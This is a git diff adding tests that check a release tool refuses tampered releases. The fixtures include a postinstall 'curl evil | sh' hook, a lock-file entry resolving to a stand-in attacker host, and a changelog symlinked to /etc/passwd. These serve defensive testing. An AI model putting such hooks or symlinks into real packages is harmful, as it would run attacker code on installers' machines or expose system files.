@@ -10,6 +10,7 @@ import { refsOf } from './helpers/gitRepo.js';
 import {
   RELEASE_FILES, nextVersion, appMain, appCheckoutProblem, appVersionAt, addChangelogLines, commitChangelog, advanceMain, releaseProblem,
   MAIN_MOVED, APP_FOLDER_EDITED, EDITED_AFTER_MAIN_MOVED, NO_MAIN, FILES_NOT_UPDATED, FILES_BEHIND, IGNORED_IN_THE_WAY, MAIN_NOT_PUT_BACK, RELEASE_TOUCHED_CODE, RELEASE_VERSION_DIFFERS, RELEASE_NOT_ON_MAIN,
+  releaseContentProblem, RELEASE_CHANGED_SETTINGS,
 } from '../src/factory/change/mainline.js';
 
 const ID = ['-c', 'user.name=Test', '-c', 'user.email=test@example.com'];
@@ -475,4 +476,69 @@ test('releaseProblem refuses malformed input plainly, without running git on it'
   assert.notEqual(await releaseProblem({ ...ok, release: null }), null);
   assert.notEqual(await releaseProblem({ ...ok, expectedVersion: '0.3' }), null);
   assert.equal(await releaseProblem(ok), null);
+});
+
+// A release made by hand on top of the changelog commit: the versions raised as the release script does, then
+// `mutate(worktree)` changes whatever the test needs; committed "release: v0.3.0", tagged, main moved there.
+async function releaseWith(mutate) {
+  const a = await changelogApp();
+  assert.deepEqual(await advanceMain({ appDir: a.appDir, from: a.mainAtStart, to: a.sha }), { ok: true });
+  const w = path.join(mkdtempSync(path.join(tmpdir(), 'rel-')), 'w');
+  await out(a.appDir, ['worktree', 'add', '-q', '--detach', w, a.sha]);
+  for (const file of ['package.json', 'package-lock.json', 'foundation.json']) {
+    const j = JSON.parse(readFileSync(path.join(w, file), 'utf8'));
+    j.version = '0.3.0';
+    if (j.packages?.['']) j.packages[''].version = '0.3.0';
+    if (file === 'foundation.json') j.commit = 'v0.3.0';
+    writeFileSync(path.join(w, file), `${JSON.stringify(j, null, 2)}\n`);
+  }
+  writeFileSync(path.join(w, 'CHANGELOG.md'), readFileSync(path.join(w, 'CHANGELOG.md'), 'utf8').replace('## [Unreleased]\n', '## [Unreleased]\n\n## [0.3.0] - 2026-10-28\n'));
+  await mutate(w);
+  await out(w, ['add', '-A']);
+  await out(w, [...ID, 'commit', '-q', '-m', 'release: v0.3.0']);
+  const rel = await out(w, ['rev-parse', 'HEAD']);
+  await out(a.appDir, ['worktree', 'remove', '--force', w]);
+  await out(a.appDir, [...ID, 'tag', '-a', 'v0.3.0', '-m', 'v0.3.0', rel]);
+  await out(a.appDir, ['update-ref', 'refs/heads/main', rel]);
+  const check = () => releaseProblem({ appDir: a.appDir, from: a.sha, release: { version: '0.3.0', sha: rel, tag: 'v0.3.0' }, expectedVersion: '0.3.0' });
+  return { ...a, rel, check };
+}
+const editJson = (w, file, fn) => {
+  const j = JSON.parse(readFileSync(path.join(w, file), 'utf8'));
+  fn(j);
+  writeFileSync(path.join(w, file), `${JSON.stringify(j, null, 2)}\n`);
+};
+
+test('a genuine release (versions, foundation.json commit stamp, changelog) passes the content check', async () => {
+  const r = await releaseWith(() => {});
+  assert.equal(await r.check(), null);
+  assert.equal(await releaseContentProblem(r.appDir, r.sha, r.rel), null);
+});
+
+test('a release that changes package.json scripts or dependencies is refused', async () => {
+  const scripts = await releaseWith((w) => editJson(w, 'package.json', (j) => { j.scripts = { postinstall: 'curl evil | sh' }; }));
+  assert.equal(await scripts.check(), RELEASE_CHANGED_SETTINGS(['package.json']));
+  const deps = await releaseWith((w) => editJson(w, 'package.json', (j) => { j.dependencies = { 'left-pad': '1.0.0' }; }));
+  assert.equal(await deps.check(), RELEASE_CHANGED_SETTINGS(['package.json']));
+});
+
+test('a release that changes the lock file beyond its versions is refused', async () => {
+  const r = await releaseWith((w) => editJson(w, 'package-lock.json', (j) => { j.packages['node_modules/x'] = { version: '1.0.0', resolved: 'https://evil.example/x.tgz', integrity: 'sha512-AAAA' }; }));
+  assert.equal(await r.check(), RELEASE_CHANGED_SETTINGS(['package-lock.json']));
+});
+
+test('a release that changes foundation.json beyond version and its commit stamp is refused', async () => {
+  const r = await releaseWith((w) => editJson(w, 'foundation.json', (j) => { j.name = 'something-else'; }));
+  assert.equal(await r.check(), RELEASE_CHANGED_SETTINGS(['foundation.json']));
+});
+
+test('a release that turns CHANGELOG.md into a link is refused', async () => {
+  const r = await releaseWith((w) => { rmSync(path.join(w, 'CHANGELOG.md')); symlinkSync('/etc/passwd', path.join(w, 'CHANGELOG.md')); });
+  assert.equal(await r.check(), RELEASE_CHANGED_SETTINGS(['CHANGELOG.md']));
+});
+
+test('a release that leaves a release file as unreadable JSON is refused (fails closed)', async () => {
+  const r = await releaseWith((w) => writeFileSync(path.join(w, 'package-lock.json'), '{not json'));
+  assert.equal(await r.check(), RELEASE_CHANGED_SETTINGS(['package-lock.json']));
+  assert.equal(RELEASE_CHANGED_SETTINGS(['a', 'b']), 'The release step changed more than the version numbers in a, b, so nothing was shipped.');
 });
